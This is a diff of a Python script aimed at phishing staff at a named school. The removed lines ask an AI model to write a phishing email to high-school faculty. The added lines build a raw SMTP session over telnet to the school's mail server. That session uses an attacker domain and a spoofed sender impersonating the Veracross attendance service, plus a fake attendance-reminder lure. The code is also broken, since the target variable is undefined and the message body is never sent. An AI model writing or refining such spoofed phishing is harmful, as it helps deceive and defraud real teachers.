@@ -1,18 +1,18 @@
-from openai import OpenAI
-import requests
+import os
 
-client = OpenAI()
-
-completion = client.complete.create(
-    model: "gpt-4o-mini",
-    messages: [
-        {
-            "role": "developer", "content": "You are writing a phishing email to a John Burroughs teacher." #int
-        },
-        {
-            "role": "user", "content": "Write a phishing email directed towards highschool faculty" # what you would put in ChatGPT chat box 
-        },
-    ],
-    
+def monthlyEmail(name,date,time):
+    os.system(
+    f"""
+telnet <jburroughs.org> 25 
+helo <attacker-domain>
+mail from: <attacker-email-address>
+rcpt to: {targetEmail}
+data
+from: "<Veracross>" <m@mail3.veracross.com>
+to: {targetEmail}
+subject: Veracross: Attendance reminder for today, {date}
+    """
 )
-print(completion.choices[0].message.content)
+    return f"Hello {name}, \n\nPlease find below the classes that need attendance taken for today, {date}, as of {time} \n\n3rd Period \n\nThank you for taking the time to complete this very important task!"
+
+print(monthlyEmail("Ken","Jan 30","11:29"))
